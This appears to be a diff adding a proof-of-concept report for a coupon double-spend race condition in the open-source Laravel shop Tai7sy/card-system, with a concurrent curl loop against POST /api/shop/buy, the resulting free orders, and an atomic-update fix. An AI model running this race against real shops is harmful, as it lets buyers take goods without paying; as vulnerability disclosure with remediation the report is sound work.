@@ -1,0 +1,53 @@
+CARD-02 PoC — Single-use coupon double-spend (TOCTOU race) on POST /api/shop/buy
+=================================================================================
+Target: Tai7sy/card-system @ 4e908dd55f50f1cb6d70eba0d34efb1ec7d74ea3 (Laravel 5.5)
+File:   app/Http/Controllers/Shop/Pay.php, function buy() (single-line source)
+
+Root cause: coupon eligibility is checked with a plain non-locking SELECT
+(whereRaw '`count_used`<`count_all`') OUTSIDE the order transaction; consumption
+(status=STATUS_USED; count_used++; save()) happens later inside DB::transaction
+with no SELECT ... FOR UPDATE on the coupon row -> N concurrent requests all
+pass the pre-check on the same snapshot.
+
+Setup (LOCAL instance, 4 php -S processes sharing one MySQL 8.0.39):
+- product id=1 price=0.01 CNY, 17 unsold cards
+- coupon 'RACE1': type=ONETIME count_all=1 discount_type=AMOUNT discount_val=1
+  (== product price => paid=0 => immediate free shipping)
+- endpoint: POST /api/shop/buy   (routes/api.php shop group, 'api' prefix,
+  api middleware = bindings only, no auth beyond client-chosen 'customer')
+
+Attack — 16 concurrent POSTs (4 per worker process), released by a barrier:
+
+    for i in $(seq 1 16); do
+      curl -s -o /dev/null -w "%{http_code}\n" -X POST "http://127.0.0.1:<port>/api/shop/buy" \
+        -d "customer=<32-hex>&product_id=1&count=1&pay_id=<pay>&coupon=RACE1&contact=r${i}@t.io" &
+    done; wait
+
+Result (round 1): 3 requests won (HTTP 302 = order created), 13 rejected with
+'coupon invalid' -> a count_all=1 coupon produced THREE discounted orders.
+
+DB state AFTER the race:
+  orders:
+    order_no             count price discount paid status remark
+    202609300008248GL2l  1     1     1        0   2      使用优惠券: RACE1
+    20260930000824VOgMa  1     1     1        0   2      使用优惠券: RACE1
+    20260930000824aeXPi  1     1     1        0   2      使用优惠券: RACE1
+  coupons:
+    id coupon count_used count_all status
+    2  RACE1  1          1         2
+  card_order (3 DISTINCT cards shipped free):
+    202609300008248GL2l -> card 11111
+    20260930000824VOgMa -> card 11112
+    20260930000824aeXPi -> card 11113
+
+Accuracy notes (verified):
+1. count_used does NOT visibly overflow: Eloquent persists the stale in-memory
+   counter with an absolute-value UPDATE (sets count_used=1), so the ledger
+   converges and looks clean; the double-spend manifests as the untracked free
+   orders/shipments (use-limit bypass).
+2. Endpoint is POST /api/shop/buy (api prefix from RouteServiceProvider).
+
+Fix: consume the coupon atomically inside the order transaction -
+SELECT ... FOR UPDATE on the coupon row, or
+UPDATE coupons SET count_used = count_used + 1
+WHERE id = ? AND count_used < count_all   (reject order on 0 affected rows).
